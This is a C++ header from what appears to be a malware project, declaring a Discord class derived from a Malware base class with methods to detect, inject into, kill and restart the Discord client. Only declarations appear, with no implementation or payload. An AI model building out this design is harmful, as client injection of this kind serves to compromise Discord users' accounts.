#pragma once
#ifndef DISCORD_HPP
#define DISCORD_HPP

#include "Malware.hpp"

/*
    Discord class
    @file Discord.hpp
    @author miaouCorp
    @version 1.2
*/

class Discord : public Malware 
{
    private:
        bool DiscordInstalled{ false };
        bool InjectionWrited{ false };
        bool DiscordKilled{ false };
        bool DiscordRestarted{ false };

    public:
        bool checkDiscord();
        bool injectDiscord();
        bool killDiscord();
        bool restartDiscord();
        bool isDiscordRestarted() const;
        bool isInjectionWrited() const;
        bool isDiscordInstalled() const;
        bool isDiscordKilled() const;
};

#endif